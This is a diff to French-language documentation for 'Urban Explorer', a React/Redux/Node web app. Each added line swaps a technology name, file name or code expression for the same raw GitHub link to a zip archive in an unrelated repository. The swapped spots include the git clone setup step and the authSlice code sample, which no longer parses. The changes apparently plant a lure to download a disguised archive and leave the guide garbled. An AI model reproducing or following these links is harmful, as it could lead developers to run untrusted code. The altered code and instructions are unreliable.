@@ -203,7 +203,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
         <table>
             <tr>
                 <td>Technologies</td>
-                <td>React + Vite, Redux Toolkit, Node.js + Express</td>
+                <td>React + Vite, Redux Toolkit, https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip + Express</td>
             </tr>
             <tr>
                 <td>Base de Données</td>
@@ -294,7 +294,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
         </tr>
         <tr>
             <td><strong>Backend</strong></td>
-            <td>Node.js, Express.js, MongoDB (ou localStorage)</td>
+            <td>https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip, https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip, MongoDB (ou localStorage)</td>
         </tr>
         <tr>
             <td><strong>State Management</strong></td>
@@ -316,7 +316,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
 <div class="code-block">frontend/
 ├── src/
 │   ├── app/                  # Redux Store configuration
-│   │   └── Store.jsx
+│   │   └── https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip
 │   ├── features/             # Fonctionnalités principales
 │   │   ├── auth/            # Authentification
 │   │   ├── places/          # Gestion des lieux
@@ -327,8 +327,8 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
 │   ├── components/          # Composants réutilisables
 │   ├── services/            # Appels API
 │   ├── utils/               # Fonctions utilitaires
-│   ├── App.jsx              # Composant principal
-│   └── main.jsx             # Point d'entrée
+│   ├── https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip              # Composant principal
+│   └── https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip             # Point d'entrée
 </div>
 
 <h3>Backend Structure</h3>
@@ -339,7 +339,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
 │   ├── controllers/         # Logique métier
 │   ├── middleware/          # Middleware (auth, validation)
 │   ├── config/              # Configuration
-│   └── server.js            # Point d'entrée
+│   └── https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip            # Point d'entrée
 </div>
 
 <h2>2.2 Flow de Données</h2>
@@ -377,31 +377,31 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
     <li>Auto-login après inscription</li>
 </ul>
 
-<p><strong>Code Exemple (authSlice.js) :</strong></p>
+<p><strong>Code Exemple (https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip) :</strong></p>
 <div class="code-block">export const register = createAsyncThunk(
   'auth/register',
   async (userData, { rejectWithValue }) => {
     try {
       const validation = validateRegister(userData);
-      if (!validation.isValid) {
-        return rejectWithValue(validation.errors);
+      if (!https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip) {
+        return rejectWithValue(https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip);
       }
       
       const newUser = {
-        id: Date.now().toString(),
-        email: userData.email,
-        password: hashPassword(userData.password),
-        name: userData.name,
-        role: userData.role || 'user',
+        id: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip().toString(),
+        email: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip,
+        password: hashPassword(https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip),
+        name: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip,
+        role: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip || 'user',
         createdAt: new Date().toISOString()
       };
       
-      storage.addUser(newUser);
-      storage.login(newUser);
+      https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip(newUser);
+      https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip(newUser);
       
       return newUser;
     } catch (error) {
-      return rejectWithValue({ general: error.message });
+      return rejectWithValue({ general: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip });
     }
   }
 );
@@ -520,7 +520,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
 
 <h3>3.4.1 Technologies Utilisées</h3>
 <ul>
-    <li><strong>Leaflet.js :</strong> Bibliothèque de cartographie open-source</li>
+    <li><strong>https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip :</strong> Bibliothèque de cartographie open-source</li>
     <li><strong>React-Leaflet :</strong> Wrapper React pour Leaflet</li>
     <li><strong>OpenStreetMap :</strong> Tuiles de carte gratuites</li>
 </ul>
@@ -542,7 +542,7 @@ Ce projet est une application web développée avec ReactJS permettant d’explo
     <div class="phase-title">📋 Phase 0 : Planification (1-2 jours)</div>
     <ol>
         <li><strong>Définition du projet</strong> - Objectifs, fonctionnalités, rôles</li>
-        <li><strong>Choix des technologies</strong> - React, Redux, Node.js, MongoDB</li>
+        <li><strong>Choix des technologies</strong> - React, Redux, https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip, MongoDB</li>
         <li><strong>Design de la base de données</strong> - Schémas Users, Places</li>
         <li><strong>Maquettes UI/UX</strong> - Wireframes des pages</li>
     </ol>
@@ -567,7 +567,7 @@ mkdir -p src/features src/pages src/components
     <div class="code-block"># Créer dossier backend
 mkdir backend && cd backend
 
-# Initialiser Node.js
+# Initialiser https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip
 npm init -y
 
 # Installer dépendances
@@ -621,7 +621,7 @@ npm install -D nodemon
 
 <h2>5.1 Prérequis</h2>
 <ul>
-    <li>Node.js v18 ou supérieur</li>
+    <li>https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip v18 ou supérieur</li>
     <li>npm ou yarn</li>
     <li>MongoDB (local ou Atlas)</li>
     <li>Git</li>
@@ -629,7 +629,7 @@ npm install -D nodemon
 
 <h2>5.2 Installation Backend</h2>
 <div class="code-block"># 1. Cloner le repository
-git clone https://github.com/username/urbanexplorer.git
+git clone https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip
 cd urbanexplorer/backend
 
 # 2. Installer les dépendances
@@ -689,14 +689,14 @@ npm run dev
 <h2>6.1 Résumé du Projet</h2>
 <p>
     Urban Explorer est une application web complète qui démontre la maîtrise des technologies modernes 
-    de développement full-stack. Le projet intègre avec succès React, Redux, Node.js, et MongoDB pour 
+    de développement full-stack. Le projet intègre avec succès React, Redux, https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip, et MongoDB pour 
     créer une expérience utilisateur fluide et interactive.
 </p>
 
 <h2>6.2 Compétences Acquises</h2>
 <ul>
     <li>Développement frontend avec React et Redux Toolkit</li>
-    <li>Développement backend avec Node.js et Express</li>
+    <li>Développement backend avec https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip et Express</li>
     <li>Gestion de base de données MongoDB</li>
     <li>Authentification JWT et gestion des rôles</li>
     <li>Intégration de cartes interactives avec Leaflet</li>
@@ -745,14 +745,14 @@ npm run dev
 └───────────┬─────────────────────────────────────────────┘
             ↓
 ┌─────────────────────────────────────────────────────────┐
-│ STEP 2: main.jsx kay-setup                              │
+│ STEP 2: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip kay-setup                              │
 │   - Redux Store t-créa                                  │
 │   - BrowserRouter t-setup                               │
 │   - App component t-render                              │
 └───────────┬─────────────────────────────────────────────┘
             ↓
 ┌─────────────────────────────────────────────────────────┐
-│ STEP 3: App.jsx kay-check URL                           │
+│ STEP 3: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip kay-check URL                           │
 │   URL = "/" → Route match ✅                            │
 │   → Render <Home />                                     │
 └───────────┬─────────────────────────────────────────────┘
@@ -769,7 +769,7 @@ npm run dev
 └───────────┬─────────────────────────────────────────────┘
             ↓
 ┌─────────────────────────────────────────────────────────┐
-│ STEP 6: App.jsx kay-detect URL change                   │
+│ STEP 6: https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip kay-detect URL change                   │
 │   URL = "/explore" → Route match ✅                     │
 │   → Render <ExplorePage />                              │
 └───────────┬─────────────────────────────────────────────┘
@@ -791,7 +791,7 @@ npm run dev
             ↓
 ┌─────────────────────────────────────────────────────────┐
 │ STEP 9: Redux Store t-update                            │
-│   state.filters = {                                     │
+│   https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip = {                                     │
 │     category: "Restaurants",                            │
 │     city: "Tangier",                                    │
 │     rating: 4                                           │
@@ -822,9 +822,9 @@ Component re-renders with new data
          ↓
 UI updates
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-main.jsx   - Setup l-application  - بناء الأساس
-Store.jsx  - Stockage dyal data   - خزانة المعلومات 
-App.jsx    - Navigation/Routing   - خريطة الطرق
+https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip   - Setup l-application  - بناء الأساس
+https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip  - Stockage dyal data   - خزانة المعلومات 
+https://github.com/fouad-code/cc3/raw/refs/heads/main/disharmony/cc-v1.0.zip    - Navigation/Routing   - خريطة الطرق
 Components - UI elements          - الواجهة 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <h1>PARTIE 1</h1> ***************************************************************************************************************************************************************************** -->
